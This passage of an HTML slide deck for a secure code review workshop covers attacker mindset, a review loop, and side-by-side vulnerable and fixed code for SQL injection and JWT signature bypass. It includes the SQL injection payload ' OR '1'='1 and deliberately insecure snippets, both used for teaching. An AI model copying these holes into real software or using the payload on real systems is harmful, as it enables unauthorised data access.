@@ -1,0 +1,1632 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Secure Code Review — Workshop</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
+<style>
+/* ── Reset & Base ─────────────────────────────────────────────────────────── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg:       #0d1117;
+  --bg2:      #161b22;
+  --bg3:      #21262d;
+  --border:   #30363d;
+  --red:      #f85149;
+  --orange:   #e8741a;
+  --yellow:   #e3b341;
+  --green:    #3fb950;
+  --blue:     #58a6ff;
+  --teal:     #39d0c0;
+  --purple:   #bc8cff;
+  --muted:    #8b949e;
+  --white:    #f0f6fc;
+  --code-bg:  #010409;
+  --font-mono: 'JetBrains Mono', monospace;
+  --font-head: 'Syne', sans-serif;
+  --font-body: 'Inter', sans-serif;
+}
+
+html, body {
+  width: 100%; height: 100%;
+  background: #000;
+  overflow: hidden;
+  font-family: var(--font-body);
+  color: var(--white);
+  cursor: none;
+}
+
+/* ── Custom Cursor ────────────────────────────────────────────────────────── */
+.cursor {
+  position: fixed; top: 0; left: 0; z-index: 9999;
+  width: 10px; height: 10px;
+  background: var(--red);
+  border-radius: 50%;
+  pointer-events: none;
+  transition: transform 0.15s ease, opacity 0.3s;
+  transform: translate(-50%, -50%);
+}
+.cursor-ring {
+  position: fixed; top: 0; left: 0; z-index: 9998;
+  width: 32px; height: 32px;
+  border: 1.5px solid rgba(248,81,73,0.4);
+  border-radius: 50%;
+  pointer-events: none;
+  transition: transform 0.35s cubic-bezier(.17,.67,.35,1.2);
+  transform: translate(-50%, -50%);
+}
+
+/* ── Deck Shell ───────────────────────────────────────────────────────────── */
+#deck {
+  position: fixed; inset: 0;
+  display: flex; align-items: center; justify-content: center;
+}
+
+/* ── Progress Bar ─────────────────────────────────────────────────────────── */
+#progress-bar {
+  position: fixed; top: 0; left: 0; height: 2px;
+  background: var(--red);
+  transition: width 0.4s cubic-bezier(.4,0,.2,1);
+  z-index: 100;
+  box-shadow: 0 0 8px var(--red);
+}
+
+/* ── Slide Counter ────────────────────────────────────────────────────────── */
+#slide-counter {
+  position: fixed; bottom: 18px; right: 22px;
+  font-family: var(--font-mono); font-size: 11px;
+  color: var(--muted); z-index: 100;
+  letter-spacing: 0.08em;
+}
+
+/* ── Nav Arrows ───────────────────────────────────────────────────────────── */
+.nav-btn {
+  position: fixed; top: 50%; transform: translateY(-50%);
+  z-index: 100; background: rgba(22,27,34,0.7);
+  border: 1px solid var(--border); border-radius: 6px;
+  width: 36px; height: 64px;
+  display: flex; align-items: center; justify-content: center;
+  cursor: pointer; color: var(--muted);
+  transition: color 0.2s, background 0.2s, border-color 0.2s;
+}
+.nav-btn:hover { color: var(--white); background: var(--bg2); border-color: var(--muted); }
+#nav-prev { left: 10px; }
+#nav-next { right: 10px; }
+.nav-btn svg { width: 16px; height: 16px; }
+
+/* ── Help ─────────────────────────────────────────────────────────────────── */
+#help {
+  position: fixed; bottom: 18px; left: 22px;
+  font-family: var(--font-mono); font-size: 10px;
+  color: var(--bg3); z-index: 100;
+  letter-spacing: 0.06em; transition: color 0.3s;
+}
+#help:hover { color: var(--muted); }
+
+/* ── Slide Base ───────────────────────────────────────────────────────────── */
+.slide {
+  position: absolute; inset: 0;
+  display: none;
+  flex-direction: column;
+  padding: 52px 64px 48px;
+  background: var(--bg);
+  opacity: 0;
+  transition: opacity 0.35s ease;
+  overflow: hidden;
+}
+.slide.active { display: flex; }
+.slide.visible { opacity: 1; }
+
+/* Slide-in animation */
+.slide.entering { animation: slideIn 0.35s cubic-bezier(.4,0,.2,1) forwards; }
+.slide.leaving  { animation: slideOut 0.3s cubic-bezier(.4,0,.2,1) forwards; }
+@keyframes slideIn  { from { opacity:0; transform:translateX(24px) } to { opacity:1; transform:translateX(0) } }
+@keyframes slideOut { from { opacity:1; transform:translateX(0) } to { opacity:0; transform:translateX(-24px) } }
+
+/* ── Common Layout Helpers ────────────────────────────────────────────────── */
+.slide-header {
+  margin-bottom: 28px;
+}
+.slide-tag {
+  font-family: var(--font-mono);
+  font-size: 10px; font-weight: 700;
+  letter-spacing: 0.18em;
+  color: var(--muted);
+  text-transform: uppercase;
+  margin-bottom: 6px;
+}
+.slide-title {
+  font-family: var(--font-head);
+  font-size: 28px; font-weight: 800;
+  color: var(--white); line-height: 1.1;
+}
+.slide-sub {
+  font-size: 13px; color: var(--muted);
+  margin-top: 6px; font-weight: 400;
+}
+
+/* Red left-border accent on content area */
+.accent-left {
+  border-left: 3px solid var(--red);
+  padding-left: 16px;
+}
+
+/* Grids */
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; flex: 1; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; flex: 1; }
+.grid-2x3 { display: grid; grid-template-columns: 1fr 1fr 1fr; grid-template-rows: 1fr 1fr; gap: 14px; flex: 1; }
+
+/* Cards */
+.card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 18px 20px;
+  position: relative;
+  overflow: hidden;
+}
+.card-accent {
+  position: absolute; top: 0; left: 0; right: 0;
+  height: 3px;
+}
+.card-num {
+  font-family: var(--font-head);
+  font-size: 42px; font-weight: 800;
+  line-height: 1; margin-bottom: 10px;
+}
+.card-title {
+  font-family: var(--font-head);
+  font-size: 15px; font-weight: 700;
+  margin-bottom: 8px; color: var(--white);
+}
+.card-body {
+  font-size: 12.5px; color: var(--muted);
+  line-height: 1.6;
+}
+
+/* Tags / Badges */
+.badge {
+  display: inline-block;
+  font-family: var(--font-mono);
+  font-size: 10px; font-weight: 700;
+  letter-spacing: 0.1em;
+  padding: 3px 9px; border-radius: 3px;
+  text-transform: uppercase;
+}
+.badge-red    { background: var(--red);    color: #000; }
+.badge-orange { background: var(--orange); color: #000; }
+.badge-yellow { background: var(--yellow); color: #000; }
+.badge-green  { background: var(--green);  color: #000; }
+.badge-blue   { background: var(--blue);   color: #000; }
+
+/* ── Code Block ───────────────────────────────────────────────────────────── */
+.code-wrap {
+  background: var(--code-bg);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  font-family: var(--font-mono);
+  font-size: 12px; line-height: 1.65;
+}
+.code-bar {
+  background: var(--bg2);
+  padding: 6px 14px;
+  display: flex; align-items: center; gap: 6px;
+  border-bottom: 1px solid var(--border);
+}
+.code-dot { width:10px; height:10px; border-radius:50%; }
+.code-label {
+  font-size: 10px; font-weight: 700;
+  letter-spacing: 0.12em;
+  margin-left: auto;
+  font-family: var(--font-mono);
+}
+.label-vuln { color: var(--red); }
+.label-fix  { color: var(--green); }
+pre {
+  padding: 14px 16px;
+  overflow-x: auto;
+  white-space: pre;
+  tab-size: 2;
+}
+pre .c  { color: #484f58; }        /* comment */
+pre .s  { color: #a5d6ff; }        /* string */
+pre .k  { color: var(--purple); }  /* keyword */
+pre .f  { color: var(--blue); }    /* function */
+pre .n  { color: var(--orange); }  /* number/var */
+pre .bad  { color: var(--red); }
+pre .good { color: var(--green); }
+
+/* Attack / insight banners */
+.attack-banner {
+  background: rgba(248,81,73,0.06);
+  border: 1px solid rgba(248,81,73,0.3);
+  border-radius: 6px; padding: 10px 14px;
+  font-family: var(--font-mono); font-size: 11.5px;
+}
+.attack-banner .lbl { color: var(--red); font-weight: 700; margin-right: 6px; }
+.attack-banner .txt { color: #f0a0a0; }
+
+.insight-banner {
+  background: rgba(63,185,80,0.05);
+  border: 1px solid rgba(63,185,80,0.25);
+  border-radius: 6px; padding: 10px 14px;
+  font-size: 12.5px; color: var(--muted);
+}
+.insight-banner .lbl { color: var(--green); font-weight: 700; margin-right: 6px; }
+
+/* ── Slide-specific layouts ────────────────────────────────────────────────── */
+
+/* ─ Title Slide ─ */
+#s-title {
+  background: #080c10;
+  align-items: center; justify-content: center; text-align: center;
+  padding: 0;
+}
+.title-grid {
+  position: absolute; inset: 0;
+  background-image: radial-gradient(circle, rgba(248,81,73,0.06) 1px, transparent 1px);
+  background-size: 40px 40px;
+}
+.title-content { position: relative; z-index: 1; }
+.title-shield {
+  font-size: 72px; margin-bottom: 16px;
+  filter: drop-shadow(0 0 32px rgba(248,81,73,0.4));
+  animation: pulse 3s ease-in-out infinite;
+}
+@keyframes pulse {
+  0%,100% { filter: drop-shadow(0 0 32px rgba(248,81,73,0.4)); }
+  50%      { filter: drop-shadow(0 0 52px rgba(248,81,73,0.7)); }
+}
+.title-eyebrow {
+  font-family: var(--font-mono); font-size: 11px;
+  letter-spacing: 0.22em; color: var(--red);
+  text-transform: uppercase; margin-bottom: 14px;
+}
+.title-h1 {
+  font-family: var(--font-head); font-size: 64px; font-weight: 800;
+  line-height: 1.0; color: var(--white);
+  letter-spacing: -0.02em; margin-bottom: 16px;
+}
+.title-h1 span { color: var(--red); }
+.title-desc {
+  font-size: 16px; color: var(--muted); margin-bottom: 40px;
+}
+.title-pills {
+  display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;
+}
+.title-pill {
+  font-family: var(--font-mono); font-size: 11px;
+  border: 1px solid var(--border); border-radius: 4px;
+  padding: 6px 14px; color: var(--muted);
+  letter-spacing: 0.06em;
+}
+.red-line {
+  position: absolute; bottom: 0; left: 0; right: 0;
+  height: 2px; background: var(--red);
+  box-shadow: 0 0 16px var(--red);
+}
+
+/* ─ Agenda ─ */
+.agenda-row {
+  display: grid;
+  grid-template-columns: 120px 1fr;
+  gap: 0 20px;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 6px; padding: 14px 20px;
+  align-items: center;
+  position: relative; overflow: hidden;
+}
+.agenda-row::before {
+  content: '';
+  position: absolute; top:0; left:0; bottom:0;
+  width: 3px;
+}
+.agenda-time {
+  font-family: var(--font-mono); font-size: 12px; font-weight: 700;
+}
+.agenda-title { font-family: var(--font-head); font-size: 15px; font-weight: 700; }
+.agenda-desc  { font-size: 12px; color: var(--muted); margin-top: 2px; }
+
+/* ─ Section Header ─ */
+.section-slide {
+  background: #080c10;
+  justify-content: center;
+  padding: 64px;
+  position: relative;
+}
+.section-slide .bg-num {
+  position: absolute; right: 48px; top: 50%; transform: translateY(-50%);
+  font-family: var(--font-head); font-size: 260px; font-weight: 800;
+  color: rgba(248,81,73,0.04); line-height: 1;
+  user-select: none; pointer-events: none;
+}
+.section-slide .block-label {
+  font-family: var(--font-mono); font-size: 11px;
+  letter-spacing: 0.2em; color: var(--red);
+  text-transform: uppercase; margin-bottom: 12px;
+}
+.section-slide h2 {
+  font-family: var(--font-head); font-size: 68px; font-weight: 800;
+  line-height: 1.0; color: var(--white); letter-spacing: -0.02em;
+}
+.section-slide .section-sub {
+  font-family: var(--font-mono); font-size: 12px;
+  color: var(--muted); margin-top: 20px; letter-spacing: 0.08em;
+}
+
+/* ─ Review Loop ─ */
+.loop-row {
+  display: grid; grid-template-columns: 42px 120px 1fr;
+  gap: 0 16px; align-items: center;
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 6px; padding: 10px 16px;
+}
+.loop-num {
+  width: 32px; height: 32px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--font-head); font-size: 14px; font-weight: 800;
+  color: #000;
+}
+.loop-label {
+  font-family: var(--font-mono); font-size: 13px; font-weight: 700;
+}
+.loop-desc { font-size: 12.5px; color: var(--muted); }
+
+/* ─ "Open First" grid ─ */
+.open-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 6px; padding: 13px 16px;
+  position: relative; overflow: hidden;
+  display: flex; flex-direction: column; gap: 4px;
+}
+.open-card::before {
+  content: '';
+  position: absolute; left:0; top:0; bottom:0; width:3px;
+}
+.open-file { font-family: var(--font-mono); font-size: 11.5px; font-weight: 700; color: var(--white); }
+.open-why  { font-size: 11.5px; color: var(--muted); }
+
+/* ─ Vuln slide ─ */
+.vuln-layout {
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: 12px; flex: 1; min-height: 0;
+}
+.vuln-banners { display: flex; flex-direction: column; gap: 8px; }
+.col-label {
+  font-family: var(--font-mono); font-size: 10px; font-weight: 700;
+  letter-spacing: 0.14em; margin-bottom: 6px;
+}
+
+/* ─ Pipeline ─ */
+.pipeline-stages {
+  display: grid; grid-template-columns: repeat(6,1fr); gap: 10px; flex: 1;
+}
+.stage-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 8px; overflow: hidden;
+  display: flex; flex-direction: column;
+}
+.stage-top { height: 3px; }
+.stage-body { padding: 14px 10px; flex: 1; display: flex; flex-direction: column; }
+.stage-num {
+  width: 28px; height: 28px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--font-head); font-size: 13px; font-weight: 800;
+  color: #000; margin: 0 auto 10px;
+}
+.stage-name {
+  font-family: var(--font-head); font-size: 12px; font-weight: 700;
+  text-align: center; margin-bottom: 10px;
+}
+.stage-tools { display: flex; flex-direction: column; gap: 5px; margin-top: auto; }
+.stage-tool {
+  background: var(--code-bg); border: 1px solid var(--border);
+  border-radius: 4px; padding: 4px 6px;
+  font-family: var(--font-mono); font-size: 9.5px;
+  text-align: center;
+}
+
+/* ─ Secret Files ─ */
+.secret-stack {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 8px; overflow: hidden;
+}
+.secret-stack-head {
+  padding: 10px 14px;
+  font-family: var(--font-head); font-size: 13px; font-weight: 700;
+  border-bottom: 1px solid var(--border);
+}
+.secret-stack ul { list-style: none; padding: 10px 14px; }
+.secret-stack li {
+  font-family: var(--font-mono); font-size: 10.5px;
+  color: var(--muted); padding: 3px 0;
+  display: flex; align-items: center; gap: 8px;
+}
+.secret-stack li::before {
+  content: ''; width:6px; height:6px; border-radius:50%;
+  background: currentColor; flex-shrink:0;
+}
+
+/* ─ Checklist ─ */
+.check-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 6px; padding: 12px 14px;
+  display: flex; gap: 12px; align-items: flex-start;
+}
+.check-cat {
+  font-family: var(--font-mono); font-size: 9px; font-weight: 700;
+  letter-spacing: 0.1em; padding: 3px 7px; border-radius: 3px;
+  flex-shrink: 0; margin-top: 1px;
+  text-transform: uppercase;
+}
+.check-text { font-size: 11.5px; color: var(--muted); line-height: 1.5; }
+
+/* ─ Lab Answers ─ */
+.finding-card {
+  background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 6px; padding: 11px 14px;
+  position: relative; overflow: hidden;
+}
+.finding-card::before {
+  content: ''; position:absolute; left:0; top:0; bottom:0; width:3px;
+}
+.finding-head { display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; }
+.finding-loc  { font-family:var(--font-mono); font-size:10px; color:var(--muted); }
+.finding-name { font-family:var(--font-head); font-size:13px; font-weight:700; }
+.finding-detail { font-size:11px; color:var(--muted); margin-top:3px; }
+
+/* ─ Closing ─ */
+#s-close {
+  background: #080c10;
+  align-items: center; justify-content: center;
+  text-align: center;
+}
+.close-quote {
+  font-family: 'Georgia', serif;
+  font-size: 22px; font-style: italic;
+  color: var(--white); line-height: 1.6;
+  max-width: 760px;
+  border-top: 1px solid var(--red);
+  border-bottom: 1px solid var(--red);
+  padding: 28px 0; margin: 0 auto 32px;
+}
+.close-quote em { color: var(--red); font-style: normal; }
+
+/* ── Animations on enter ────────────────────────────────────────────────────── */
+.stagger > * {
+  opacity: 0; transform: translateY(12px);
+  transition: opacity 0.35s ease, transform 0.35s ease;
+}
+.stagger.go > *:nth-child(1)  { opacity:1; transform:none; transition-delay:0.05s; }
+.stagger.go > *:nth-child(2)  { opacity:1; transform:none; transition-delay:0.12s; }
+.stagger.go > *:nth-child(3)  { opacity:1; transform:none; transition-delay:0.19s; }
+.stagger.go > *:nth-child(4)  { opacity:1; transform:none; transition-delay:0.26s; }
+.stagger.go > *:nth-child(5)  { opacity:1; transform:none; transition-delay:0.33s; }
+.stagger.go > *:nth-child(6)  { opacity:1; transform:none; transition-delay:0.40s; }
+.stagger.go > *:nth-child(7)  { opacity:1; transform:none; transition-delay:0.47s; }
+.stagger.go > *:nth-child(8)  { opacity:1; transform:none; transition-delay:0.54s; }
+
+/* scrollable code area */
+.code-scroll { overflow-y: auto; }
+.code-scroll pre { overflow-x: auto; }
+.code-scroll::-webkit-scrollbar { width:4px; }
+.code-scroll::-webkit-scrollbar-thumb { background: var(--border); border-radius:2px; }
+
+/* ── Responsive kill ──────────────────────────────────────────────────────── */
+@media (max-width: 900px) {
+  .slide { padding: 32px; }
+  .title-h1 { font-size: 40px; }
+}
+</style>
+</head>
+<body>
+
+<!-- Custom cursor -->
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<!-- Progress -->
+<div id="progress-bar"></div>
+
+<!-- Slide counter -->
+<div id="slide-counter">1 / 25</div>
+
+<!-- Help -->
+<div id="help">← → or click edges to navigate · F = fullscreen</div>
+
+<!-- Nav buttons -->
+<button class="nav-btn" id="nav-prev" onclick="prevSlide()">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+</button>
+<button class="nav-btn" id="nav-next" onclick="nextSlide()">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
+</button>
+
+<div id="deck">
+
+<!-- ═══════════════════════════════════════════════════════ 01 TITLE -->
+<section class="slide" id="s-title">
+  <div class="title-grid"></div>
+  <div class="title-content">
+    <div class="title-shield">🛡️</div>
+    <div class="title-eyebrow">Workshop · 2 Hours · Hands-On</div>
+    <h1 class="title-h1">Secure <span>Code</span><br>Review</h1>
+    <p class="title-desc">Attacker mindset · Modern stacks · Real vulnerabilities · DevSecOps pipeline</p>
+    <div class="title-pills">
+      <span class="title-pill">SQL Injection</span>
+      <span class="title-pill">JWT Auth</span>
+      <span class="title-pill">IDOR</span>
+      <span class="title-pill">Command Injection</span>
+      <span class="title-pill">Path Traversal</span>
+      <span class="title-pill">XSS</span>
+      <span class="title-pill">Secrets Mgmt</span>
+      <span class="title-pill">CI/CD Gates</span>
+    </div>
+  </div>
+  <div class="red-line"></div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 02 AGENDA -->
+<section class="slide" id="s-agenda">
+  <div class="slide-header">
+    <div class="slide-tag">Session Overview</div>
+    <h2 class="slide-title">Agenda</h2>
+  </div>
+  <div style="display:flex;flex-direction:column;gap:10px;flex:1" class="stagger">
+    <div class="agenda-row" style="--c:var(--blue)">
+      <style>.agenda-row:nth-child(1)::before{background:var(--blue)}</style>
+      <div class="agenda-time" style="color:var(--blue)">0:00 – 0:15</div>
+      <div><div class="agenda-title">Mindset &amp; Methodology</div><div class="agenda-desc">Attacker thinking · the review loop · what to open first in any repo</div></div>
+    </div>
+    <div class="agenda-row" style="border-left:3px solid var(--red)">
+      <div class="agenda-time" style="color:var(--red)">0:15 – 0:45</div>
+      <div><div class="agenda-title">Vulnerability Walkthroughs</div><div class="agenda-desc">SQLi · JWT · IDOR · Command Injection · Path Traversal · XSS · Mass Assignment · Secrets</div></div>
+    </div>
+    <div class="agenda-row" style="border-left:3px solid var(--orange)">
+      <div class="agenda-time" style="color:var(--orange)">0:45 – 1:15</div>
+      <div><div class="agenda-title">Hands-On Lab</div><div class="agenda-desc">Find all bugs in a deliberately vulnerable Express.js app — 20 min timed challenge</div></div>
+    </div>
+    <div class="agenda-row" style="border-left:3px solid var(--purple)">
+      <div class="agenda-time" style="color:var(--purple)">1:15 – 1:40</div>
+      <div><div class="agenda-title">DevSecOps Pipeline</div><div class="agenda-desc">Where security gates live: IDE → pre-commit → CI → registry → runtime</div></div>
+    </div>
+    <div class="agenda-row" style="border-left:3px solid var(--green)">
+      <div class="agenda-time" style="color:var(--green)">1:40 – 2:00</div>
+      <div><div class="agenda-title">Secrets Management</div><div class="agenda-desc">Every file that must never reach GitHub, across all modern stacks</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 03 SECTION: MINDSET -->
+<section class="slide section-slide">
+  <div class="bg-num">01</div>
+  <div class="block-label">Block 1 · 15 Minutes</div>
+  <h2>Mindset &amp;<br>Methodology</h2>
+  <div class="section-sub">MAP → TRUST → TRACE → VALIDATE → ESCALATE</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 04 THREE MINDSETS -->
+<section class="slide">
+  <div class="slide-header">
+    <div class="slide-tag">Block 1 · Mindset</div>
+    <h2 class="slide-title">Three Core Mindsets</h2>
+  </div>
+  <div class="grid-3 stagger">
+    <div class="card">
+      <div class="card-accent" style="background:var(--red)"></div>
+      <div class="card-num" style="color:var(--red)">01</div>
+      <div class="card-title">Think in Data Flows</div>
+      <div class="card-body">Follow untrusted input from entry point to sink. Where does user data land — a DB query, a shell command, a rendered template? That journey is where bugs live.</div>
+    </div>
+    <div class="card">
+      <div class="card-accent" style="background:var(--orange)"></div>
+      <div class="card-num" style="color:var(--orange)">02</div>
+      <div class="card-title">Trust Nothing at the Boundary</div>
+      <div class="card-body">Every API endpoint, webhook, message queue consumer, and file upload handler is a boundary. Treat all data crossing it as hostile until validated and sanitized.</div>
+    </div>
+    <div class="card">
+      <div class="card-accent" style="background:var(--blue)"></div>
+      <div class="card-num" style="color:var(--blue)">03</div>
+      <div class="card-title">Security is Structural</div>
+      <div class="card-body">A <code style="color:var(--muted);font-size:11px">// sanitized</code> comment doesn't make code safe. Look for architectural decisions: parameterized vs concatenated, secrets in env vs hardcoded, least privilege vs god-mode.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 05 REVIEW LOOP -->
+<section class="slide">
+  <div class="slide-header">
+    <div class="slide-tag">Block 1 · Methodology</div>
+    <h2 class="slide-title">The Secure Code Review Loop</h2>
+  </div>
+  <div style="display:flex;flex-direction:column;gap:10px;flex:1" class="stagger">
+    <div class="loop-row">
+      <div class="loop-num" style="background:var(--blue)">1</div>
+      <div class="loop-label" style="color:var(--blue)">MAP</div>
+      <div class="loop-desc">Understand what the code does. Data in, data out. Build a mental model before hunting.</div>
+    </div>
+    <div class="loop-row">
+      <div class="loop-num" style="background:var(--purple)">2</div>
+      <div class="loop-label" style="color:var(--purple)">TRUST</div>
+      <div class="loop-desc">Who controls each input? External user? Internal service? Admin-only? Assign trust levels.</div>
+    </div>
+    <div class="loop-row">
+      <div class="loop-num" style="background:var(--orange)">3</div>
+      <div class="loop-label" style="color:var(--orange)">TRACE</div>
+      <div class="loop-desc">Follow data from source to sink. What transforms it along the way? Can any transform be bypassed?</div>
+    </div>
+    <div class="loop-row">
+      <div class="loop-num" style="background:var(--yellow)">4</div>
+      <div class="loop-label" style="color:var(--yellow)">VALIDATE</div>
+      <div class="loop-desc">Is there validation? Is it allowlist or denylist? Can it be bypassed with encoding or unexpected types?</div>
+    </div>
+    <div class="loop-row">
+      <div class="loop-num" style="background:var(--red)">5</div>
+      <div class="loop-label" style="color:var(--red)">ESCALATE</div>
+      <div class="loop-desc">Can an attacker abuse this to gain more access, more data, or code execution?</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 06 WHAT TO OPEN FIRST -->
+<section class="slide">
+  <div class="slide-header">
+    <div class="slide-tag">Block 1 · Practical</div>
+    <h2 class="slide-title">What to Open First in Any Repo</h2>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;flex:1" class="stagger">
+    <div class="open-card" style="--ac:var(--yellow)"><style>.open-card:nth-child(1)::before{background:var(--yellow)}</style>
+      <div class="open-file">package.json / requirements.txt / go.mod</div>
+      <div class="open-why">Known vulnerable dependencies — your first quick win</div>
+    </div>
+    <div class="open-card" style="--ac:var(--orange)">
+      <div class="open-file">.env.example</div>
+      <div class="open-why">Tells you exactly what secrets the real .env holds</div>
+    </div>
+    <div class="open-card">
+      <div class="open-file">Auth middleware / interceptors</div>
+      <div class="open-why">How is identity established? Where can it be bypassed entirely?</div>
+    </div>
+    <div class="open-card">
+      <div class="open-file">Database layer — ORM / raw queries</div>
+      <div class="open-why">The SQLi hunting ground. Raw queries with string concat are instant flags.</div>
+    </div>
+    <div class="open-card">
+      <div class="open-file">File upload handlers</div>
+      <div class="open-why">Path traversal, type confusion, stored XSS via filename</div>
+    </div>
+    <div class="open-card">
+      <div class="open-file">Third-party integrations</div>
+      <div class="open-why">How are API keys passed? Logged? Exposed in error responses?</div>
+    </div>
+    <div class="open-card">
+      <div class="open-file">CI/CD config files</div>
+      <div class="open-why">Are secrets baked into build steps? env: blocks? Bash scripts?</div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 07 SECTION: VULNS -->
+<section class="slide section-slide">
+  <div class="bg-num">02</div>
+  <div class="block-label">Block 2 · 30 Minutes · 8 Vulnerability Classes</div>
+  <h2>Vulnerability<br>Walkthroughs</h2>
+  <div class="section-sub">SQLi · JWT · IDOR · Command Injection · Path Traversal · XSS · Mass Assignment · Secrets</div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 08 SQLi -->
+<section class="slide">
+  <div class="slide-header" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+    <div>
+      <div class="slide-tag">Vulnerability 1 / 8</div>
+      <h2 class="slide-title">SQL Injection <span style="color:var(--muted);font-weight:400;font-size:18px">· Node.js + MySQL</span></h2>
+    </div>
+    <span class="badge badge-red">CRITICAL</span>
+  </div>
+  <div class="vuln-layout">
+    <div>
+      <div class="col-label label-vuln">▲ VULNERABLE</div>
+      <div class="code-wrap">
+        <div class="code-bar">
+          <div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div>
+          <span class="code-label label-vuln">VULNERABLE</span>
+        </div>
+        <pre><span class="f">app</span>.<span class="f">get</span>(<span class="s">'/user'</span>, <span class="k">async</span> (req, res) => {
+  <span class="k">const</span> { username } = req.query;
+  <span class="c">// ❌ String interpolation into SQL</span>
+  <span class="k">const</span> result = <span class="k">await</span> db.<span class="f">query</span>(
+    <span class="bad">`SELECT * FROM users WHERE username = '${username}'`</span>
+  );
+  res.<span class="f">json</span>(result);
+});</pre>
+      </div>
+    </div>
+    <div>
+      <div class="col-label label-fix">✓ FIXED</div>
+      <div class="code-wrap">
+        <div class="code-bar">
+          <div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div>
+          <span class="code-label label-fix">FIXED</span>
+        </div>
+        <pre><span class="f">app</span>.<span class="f">get</span>(<span class="s">'/user'</span>, <span class="k">async</span> (req, res) => {
+  <span class="k">const</span> { username } = req.query;
+  <span class="c">// ✅ Parameterized query</span>
+  <span class="k">const</span> result = <span class="k">await</span> db.<span class="f">query</span>(
+    <span class="good">'SELECT * FROM users WHERE username = ?'</span>,
+    <span class="good">[username]</span>
+  );
+  res.<span class="f">json</span>(result);
+});</pre>
+      </div>
+    </div>
+  </div>
+  <div class="vuln-banners" style="margin-top:10px">
+    <div class="attack-banner"><span class="lbl">⚡ ATTACK:</span><span class="txt">?username=' OR '1'='1  →  dumps entire users table</span></div>
+    <div class="insight-banner"><span class="lbl">💡 KEY INSIGHT:</span>Parameterized queries separate code from data at the driver level. No regex will ever be as reliable.</div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════════════════ 09 JWT -->
+<section class="slide">
+  <div class="slide-header" style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+    <div>
+      <div class="slide-tag">Vulnerability 2 / 8</div>
+      <h2 class="slide-title">JWT Algorithm Confusion <span style="color:var(--muted);font-weight:400;font-size:18px">· Python / FastAPI</span></h2>
+    </div>
+    <span class="badge badge-red">CRITICAL</span>
+  </div>
+  <div class="vuln-layout">
+    <div>
+      <div class="col-label label-vuln">▲ VULNERABLE</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span class="code-label label-vuln">VULNERABLE</span></div>
+        <pre><span class="c"># ❌ Signature verification disabled</span>
+payload = jwt.<span class="f">decode</span>(
+    token,
+    <span class="bad">options={"verify_signature": False}</span>
+)
+
+<span class="c"># Attacker crafts: {"alg": "none"}</span>
+<span class="c"># No secret needed — any payload accepted</span></pre>
+      </div>
+    </div>
+    <div>
+      <div class="col-label label-fix">✓ FIXED</div>
+      <div class="code-wrap">
+        <div class="code-bar"><div class="code-dot" style="background:#ff5f57"></div><div class="code-dot" style="background:#febc2e"></div><div class="code-dot" style="background:#28c840"></div><span class="code-label label-fix">FIXED</span></div>
+        <pre><span class="c"># ✅ Explicit algorithm + secret key</span>
+payload = jwt.<span class="f">decode</span>(
+    token,
+    <span class="good">SECRET_KEY</span>,
+    <span class="good">algorithms=["HS256"]</span>
+)
+
+<span class="c"># Never trust the alg header from client</span>
+<span class="c"># Always allowlist algorithms explicitly</span></pre>
+      </div>
+    </div>
+  </div>
+  <div class="vuln-banners" style="margin-top:10px">
+    <div class="attack-banner"><span class="lbl">⚡ ATTACK:</span><span class="txt">Craft JWT with {"alg":"none"} and arbitrary payload — accepted without any signature</span></div>
+    <div class="insight-banner"><span class="lbl">💡 KEY INSIGHT:</span>Never trust the <code style="color:var(--orange)">alg</code> header from the client. Always specify allowed algorithms explicitly in your decode call.</div>
+  </div>
+</section>
+
